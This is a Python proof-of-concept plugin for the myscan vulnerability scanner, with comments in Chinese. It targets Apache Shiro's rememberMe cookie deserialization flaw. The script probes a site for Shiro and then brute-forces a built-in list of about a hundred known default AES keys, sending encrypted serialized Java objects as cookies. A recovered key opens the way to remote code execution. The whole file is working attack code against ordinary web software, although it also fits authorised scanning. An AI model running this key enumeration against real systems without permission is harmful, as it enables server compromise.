# !/usr/bin/env python3
# @Time    : 2020/12/7
# @Author  : caicai
# @File    : poc_shiro_rce_2019.py

'''
如果网站是nginx，如果多个站点存在shiro，则因为去重算法，只会检测出一个网站，会存在漏报
'''
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set
from myscan.lib.core.threads import mythread
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.core.base import PocBase


class POC(PocBase):
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "shiro_rce perfolder test"
        self.vulmsg = "no detail"
        self.level = 3  # 0:Low  1:Medium 2:High
        self.success = False
        self.shirokyes = (  # 要弄就弄全点
            "kPH+bIxk5D2deZiIxcaaaA==",
            "4AvVhmFLUs0KTA3Kprsdag==",
            "Z3VucwAAAAAAAAAAAAAAAA==",
            "fCq+/xW488hMTCD+cmJ3aQ==",
            "0AvVhmFLUs0KTA3Kprsdag==",
            "1AvVhdsgUs0FSA3SDFAdag==",
            "1QWLxg+NYmxraMoxAXu/Iw==",
            "25BsmdYwjnfcWmnhAciDDg==",
            "2AvVhdsgUs0FSA3SDFAdag==",
            "3AvVhmFLUs0KTA3Kprsdag==",
            "3JvYhmBLUs0ETA5Kprsdag==",
            "r0e3c16IdVkouZgk1TKVMg==",
            "5aaC5qKm5oqA5pyvAAAAAA==",
            "5AvVhmFLUs0KTA3Kprsdag==",
            "6AvVhmFLUs0KTA3Kprsdag==",
            "6NfXkC7YVCV5DASIrEm1Rg==",
            "6ZmI6I2j5Y+R5aSn5ZOlAA==",
            "cmVtZW1iZXJNZQAAAAAAAA==",
            "7AvVhmFLUs0KTA3Kprsdag==",
            "8AvVhmFLUs0KTA3Kprsdag==",
            "8BvVhmFLUs0KTA3Kprsdag==",
            "9AvVhmFLUs0KTA3Kprsdag==",
            "OUHYQzxQ/W9e/UjiAGu6rg==",
            "a3dvbmcAAAAAAAAAAAAAAA==",
            "aU1pcmFjbGVpTWlyYWNsZQ==",
            "bWljcm9zAAAAAAAAAAAAAA==",
            "bWluZS1hc3NldC1rZXk6QQ==",
            "bXRvbnMAAAAAAAAAAAAAAA==",
            "ZUdsaGJuSmxibVI2ZHc9PQ==",
            "wGiHplamyXlVB11UXWol8g==",
            "U3ByaW5nQmxhZGUAAAAAAA==",
            "MTIzNDU2Nzg5MGFiY2RlZg==",
            "L7RioUULEFhRyxM7a2R/Yg==",
            "a2VlcE9uR29pbmdBbmRGaQ==",
            "WcfHGU25gNnTxTlmJMeSpw==",
            "OY//C4rhfwNxCQAQCrQQ1Q==",
            "5J7bIJIV0LQSN3c9LPitBQ==",
            "f/SY5TIve5WWzT4aQlABJA==",
            "bya2HkYo57u6fWh5theAWw==",
            "WuB+y2gcHRnY2Lg9+Aqmqg==",
            "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
            "3qDVdLawoIr1xFd6ietnwg==",
            "YI1+nBV//m7ELrIyDHm6DQ==",
            "6Zm+6I2j5Y+R5aS+5ZOlAA==",
            "2A2V+RFLUs+eTA3Kpr+dag==",
            "6ZmI6I2j3Y+R1aSn5BOlAA==",
            "SkZpbmFsQmxhZGUAAAAAAA==",
            "2cVtiE83c4lIrELJwKGJUw==",
            "fsHspZw/92PrS3XrPW+vxw==",
            "XTx6CKLo/SdSgub+OPHSrw==",
            "sHdIjUN6tzhl8xZMG3ULCQ==",
            "O4pdf+7e+mZe8NyxMTPJmQ==",
            "HWrBltGvEZc14h9VpMvZWw==",
            "rPNqM6uKFCyaL10AK51UkQ==",
            "Y1JxNSPXVwMkyvES/kJGeQ==",
            "lT2UvDUmQwewm6mMoiw4Ig==",
            "MPdCMZ9urzEA50JDlDYYDg==",
            "xVmmoltfpb8tTceuT5R7Bw==",
            "c+3hFGPjbgzGdrC+MHgoRQ==",
            "ClLk69oNcA3m+s0jIMIkpg==",
            "Bf7MfkNR0axGGptozrebag==",
            "1tC/xrDYs8ey+sa3emtiYw==",
            "ZmFsYWRvLnh5ei5zaGlybw==",
            "cGhyYWNrY3RmREUhfiMkZA==",
            "IduElDUpDDXE677ZkhhKnQ==",
            "yeAAo1E8BOeAYfBlm4NG9Q==",
            "cGljYXMAAAAAAAAAAAAAAA==",
            "2itfW92XazYRi5ltW0M2yA==",
            "XgGkgqGqYrix9lI6vxcrRw==",
            "ertVhmFLUs0KTA3Kprsdag==",
            "5AvVhmFLUS0ATA4Kprsdag==",
            "s0KTA3mFLUprK4AvVhsdag==",
            "hBlzKg78ajaZuTE0VLzDDg==",
            "9FvVhtFLUs0KnA3Kprsdyg==",
            "d2ViUmVtZW1iZXJNZUtleQ==",
            "yNeUgSzL/CfiWw1GALg6Ag==",
            "NGk/3cQ6F5/UNPRh8LpMIg==",
            "4BvVhmFLUs0KTA3Kprsdag==",
            "MzVeSkYyWTI2OFVLZjRzZg==",
            "empodDEyMwAAAAAAAAAAAA==",
            "A7UzJgh1+EWj5oBFi+mSgw==",
            "c2hpcm9fYmF0aXMzMgAAAA==",
            "i45FVt72K2kLgvFrJtoZRw==",
            "U3BAbW5nQmxhZGUAAAAAAA==",
            "ZnJlc2h6Y24xMjM0NTY3OA==",
            "Jt3C93kMR9D5e8QzwfsiMw==",
            "MTIzNDU2NzgxMjM0NTY3OA==",
            "vXP33AonIp9bFwGl7aT7rA==",
            "V2hhdCBUaGUgSGVsbAAAAA==",
            "Q01TX0JGTFlLRVlfMjAxOQ==",
            "ZAvph3dsQs0FSL3SDFAdag==",
            "Is9zJ3pzNh2cgTHB4ua3+Q==",
            "NsZXjXVklWPZwOfkvk6kUA==",
            "GAevYnznvgNCURavBhCr1w==",
            "66v1O8keKNV3TTcGPK1wzg==",
            "SDKOLKn2J1j/2BHjeZwAoQ==",
        )

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        self.parse = dictdata_parser(self.dictdata)
        self.maxkey = self.parse.getrootpath() + self.name
        if not self.can_output(self.maxkey):
            return
        req = {
            "method": "GET",
            "url": self.url,
            "headers": {
                "Cookie": "rememberMe=1",
            },
            "timeout": 10,
            "allow_redirects": False,
            "verify": False,
        }
        r = request(**req)
        if r != None and "deleteMe" in r.headers.get("Set-Cookie", ""):
            mythread(self.runit, self.shirokyes)
            if not self.success:
                self.save(r, "found shiro ,you can enum the key", 0)

    def runit(self, key):
        if self.success:
            return
        payload = self.generator_payload(key)
        req = {
            "method": "GET",
            "url": self.url,
            "headers": {
                "Cookie": "rememberMe={}".format(payload),
            },
            "timeout": 10,
            "allow_redirects": False,
            "verify": False,
        }
        r = request(**req)
        if r is not None and "deleteMe" not in r.headers.get('Set-Cookie', ''):
            self.can_output(self.maxkey, True)
            self.save(r, key)

    def save(self, r, key, level=None):
        if not self.success and self.can_output(self.maxkey):
            self.success = True
            parser_ = response_parser(r)
            self.result.append({
                "name": self.name,
                "url": self.url,
                "level": level if level == 0 else self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "key": key,
                    "request": parser_.getrequestraw(),
                    "response": parser_.getresponseraw()
                }

            })

    def generator_payload(self, key):
        payload = b'\xac\xed\x00\x05sr\x002org.apache.shiro.subject.SimplePrincipalCollection\xa8\x7fX%\xc6\xa3\x08J\x03\x00\x01L\x00\x0frealmPrincipalst\x00\x0fLjava/util/Map;xppw\x01\x00x'
        iv = b'w\xcf\xd7\x98\xa8\xe9LD\x97LN\xd0\xa6\n\xb8\x1a'
        backend = default_backend()
        cipher = Cipher(algorithms.AES(base64.b64decode(key)), modes.CBC(iv), backend=backend)
        encryptor = cipher.encryptor()
        BS = algorithms.AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        file_body = pad(payload)
        ct = encryptor.update(file_body)
        base64_ciphertext = base64.b64encode(iv + ct)
        return base64_ciphertext.decode()
